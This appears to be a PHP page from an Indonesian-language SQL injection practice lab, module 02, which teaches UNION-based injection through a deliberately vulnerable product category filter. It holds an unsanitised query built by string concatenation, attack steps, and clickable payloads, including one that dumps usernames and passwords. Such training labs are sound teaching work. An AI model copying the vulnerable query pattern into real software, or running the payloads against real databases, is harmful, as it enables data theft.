<?php
/**
 * =============================================================
 * LAB 02 — Injeksi SQL Berbasis UNION
 * KERENTANAN: Input tanpa sanitasi pada query filter kategori
 * =============================================================
 */
require_once '../../db.php';

$category = '';
$result = [];
$query_display = "SELECT id, name, price, category, description FROM products WHERE category='\$category'";
$error_msg = '';
$col_count = 0;
$flagFeedback = null;

// Penanganan pengiriman flag atau konfirmasi manual
if (isset($_POST['action_progress'])) {
    if ($_POST['action_progress'] === 'submit_flag') {
        $flagFeedback = submitLabFlag('02', $_POST['flag_input'] ?? '');
    } elseif ($_POST['action_progress'] === 'toggle_manual') {
        $flagFeedback = toggleManualLab('02');
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action_progress'])) {
    $category = $_POST['category'] ?? '';

    $raw_query = "SELECT id, name, price, category, description FROM products WHERE category='$category'";
    $query_display = $raw_query;

    try {
        $db = getDB();
        $stmt = $db->query($raw_query);
        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $col_count = $stmt->columnCount();
    } catch (PDOException $e) {
        $error_msg = '[SQL ERROR] ' . $e->getMessage();
    }
}

$categories = ['Elektronik', 'Aksesoris', 'Penyimpanan', 'Jaringan'];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 02 — Injeksi Berbasis UNION | Lab SQLi</title>
    <link rel="stylesheet" href="../../assets/css/style.css">
</head>
<body>
<canvas id="matrix-canvas"></canvas>

<div class="lab-page wrapper">
    <a href="../../index.php" class="nav-back">← KEMBALI KE DASHBOARD</a>

    <div class="lab-header">
        <div class="lab-header-info">
            <div style="color:var(--text-dim); font-size:0.78rem; font-family:'JetBrains Mono',monospace; letter-spacing:2px; margin-bottom:8px;">MODUL 02 / 08</div>
            <h1 style="font-size:1.85rem; margin-bottom:8px;">🔗 Injeksi Berbasis UNION</h1>
            <div class="meta" style="display:flex; align-items:center; gap:10px;">
                <span class="badge badge-medium">Menengah</span>
                <span class="vuln-label">⚠ RENTAN</span>
                <span style="color:var(--text-dim); font-size:0.82rem;">Teknik: Eksfiltrasi Data via UNION SELECT</span>
                <?php if (isLabCompleted('02')): ?>
                    <span class="badge" style="background:rgba(16,185,129,0.15); color:#34d399; border:1px solid #10b981;">✓ Selesai</span>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <?php if ($flagFeedback): ?>
    <div style="padding:14px 18px; border-radius:10px; margin-bottom:20px; font-weight:600; font-size:0.9rem;
                background: <?= $flagFeedback['success'] ? 'rgba(16,185,129,0.1)' : 'rgba(244,63,94,0.1)' ?>;
                border: 1px solid <?= $flagFeedback['success'] ? '#10b981' : '#f43f5e' ?>;
                color: <?= $flagFeedback['success'] ? '#34d399' : '#fb7185' ?>;">
        <?= htmlspecialchars($flagFeedback['message']) ?>
    </div>
    <?php endif; ?>

    <!-- Deskripsi -->
    <div class="panel">
        <div class="panel-header">
            <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
            <div class="panel-title">DESKRIPSI KERENTANAN</div>
        </div>
        <p style="font-size:0.9rem; color:var(--text-muted); line-height:1.6; margin-bottom:14px;">
            Injeksi berbasis UNION menempelkan perintah SELECT kedua ke query asli menggunakan operator <strong style="color:#f43f5e;">UNION</strong>.
            Penyerang dapat mengambil data dari tabel yang sama sekali berbeda — mengekstrak nama pengguna, kata sandi, hingga flag rahasia.
            Aturan utama: Kedua query SELECT harus memiliki <strong style="color:#fbbf24;">jumlah kolom yang persis sama</strong> (5 kolom).
        </p>
        <div class="code-block">
<span style="color:#64748b;">// QUERY RENTAN ASLI</span>
SELECT id, name, price, category, description FROM products WHERE category='<span style="color:#f43f5e;">$category</span>'

<span style="color:#64748b;">// SETELAH DIINJEKSI: category = Elektronik' UNION SELECT 1,name,value,description,5 FROM flags--</span>
SELECT id, name, price, category, description FROM products WHERE category='Elektronik'
<span style="color:#f43f5e;">UNION SELECT 1,name,value,description,5 FROM flags--</span>'
        </div>
    </div>

    <!-- Kotak Submit Flag / Progres Modul 02 -->
    <?php renderFlagSubmissionBox('02'); ?>

    <div class="grid-2">
        <!-- Form -->
        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">🎯 TARGET: FILTER PENCARIAN PRODUK</div>
                </div>
                <form method="POST">
                    <div class="form-group">
                        <label>Filter Kategori</label>
                        <input type="text" name="category" id="category"
                               placeholder="Masukkan kategori atau payload UNION..."
                               value="<?= htmlspecialchars($category) ?>">
                        <div style="margin-top:8px; display:flex; gap:8px; flex-wrap:wrap;">
                            <?php foreach ($categories as $cat): ?>
                            <button type="button" onclick="document.getElementById('category').value='<?= $cat ?>'" 
                                    class="btn btn-cyan btn-sm">
                                <?= $cat ?>
                            </button>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary btn-full">
                        ▶ &nbsp; EKSEKUSI QUERY
                    </button>
                </form>
            </div>

            <!-- Target Tujuan -->
            <div class="panel" style="border-color:rgba(6,182,212,0.3);">
                <div class="panel-header">
                    <div class="panel-title" style="color:#06b6d4;">🎯 TAHAPAN PENYERANGAN</div>
                </div>
                <div class="steps">
                    <div class="step-item">① Hitung jumlah kolom (ORDER BY)</div>
                    <div class="step-item">② Tentukan kolom yang tampil</div>
                    <div class="step-item">③ Ekstrak tabel flags</div>
                    <div class="step-item">④ Masukkan flag ke kotak verifikasi</div>
                </div>
            </div>
        </div>

        <!-- Kolom Kanan: Live Query & Hasil -->
        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">MONITOR QUERY SQL REAL-TIME</div>
                </div>
                <div class="code-block" style="color:<?= $error_msg ? '#f43f5e' : '#06b6d4' ?>; word-break:break-all;">
<?= htmlspecialchars($query_display) ?>
                </div>
            </div>

            <!-- Hasil -->
            <div class="result-panel <?= !empty($result) ? 'result-success' : ($error_msg ? 'result-error' : '') ?>">
                <?php if ($error_msg): ?>
                    <div style="color:#f43f5e; font-weight:600;"><?= htmlspecialchars($error_msg) ?></div>
                <?php elseif (!empty($result)): ?>
                    <div style="margin-bottom:10px; color:#34d399; font-size:0.85rem; font-weight:600;">
                        ✓ <?= count($result) ?> baris data dikembalikan — <?= $col_count ?> kolom
                    </div>
                    <div style="overflow-x:auto;">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <?php foreach (array_keys($result[0]) as $col): ?>
                                <th><?= htmlspecialchars($col) ?></th>
                                <?php endforeach; ?>
                            </tr>
                        </thead>
                        <tbody>
                        <?php foreach ($result as $row): ?>
                            <tr>
                                <?php foreach ($row as $key => $val): ?>
                                <td class="<?= (strpos($val ?? '', 'FLAG{') !== false) ? 'flag' : '' ?>"
                                    <?= (strpos($val ?? '', 'FLAG{') !== false) ? 'style="cursor:pointer;" title="Klik untuk salin" onclick="copyText(\''.htmlspecialchars($val).'\')"' : '' ?>>
                                    <?= htmlspecialchars($val ?? 'NULL') ?> <?= (strpos($val ?? '', 'FLAG{') !== false) ? '📋' : '' ?>
                                </td>
                                <?php endforeach; ?>
                            </tr>
                        <?php endforeach; ?>
                        </tbody>
                    </table>
                    </div>
                <?php elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action_progress'])): ?>
                    <div style="color:#f43f5e; font-size:0.85rem;">✗ Tidak ada data yang cocok</div>
                <?php else: ?>
                    <div style="color:var(--text-dim); font-size:0.85rem;">Hasil query akan tampil di sini...</div>
                <?php endif; ?>
            </div>

            <!-- Bantuan -->
            <div class="hint-box">
                <button class="hint-toggle" onclick="toggleHint('hint2')">
                    💡 PAYLOAD & PETUNJUK CEPAT <span class="arrow">▼</span>
                </button>
                <div class="hint-content" id="hint2">
                    <p><strong style="color:#fbbf24;">Klik payload untuk mengisi input form:</strong></p>
                    <ul class="payload-list">
                        <li data-target="category" data-payload="Elektronik' ORDER BY 5--">Elektronik' ORDER BY 5-- (Cek jumlah kolom)</li>
                        <li data-target="category" data-payload="x' UNION SELECT 1,2,3,4,5--">x' UNION SELECT 1,2,3,4,5-- (Petakan 5 kolom)</li>
                        <li data-target="category" data-payload="x' UNION SELECT 1,name,value,description,1 FROM flags--">x' UNION SELECT 1,name,value,description,1 FROM flags-- (Ambil Flag)</li>
                        <li data-target="category" data-payload="x' UNION SELECT 1,username,password,role,secret FROM users--">x' UNION SELECT 1,username,password,role,secret FROM users-- (Dump akun)</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="site-footer">
    <div>MODUL 02 — INJEKSI BERBASIS UNION · LAB PRAKTIK SQL INJECTION</div>
</footer>
<script src="../../assets/js/main.js"></script>
</body>
</html>
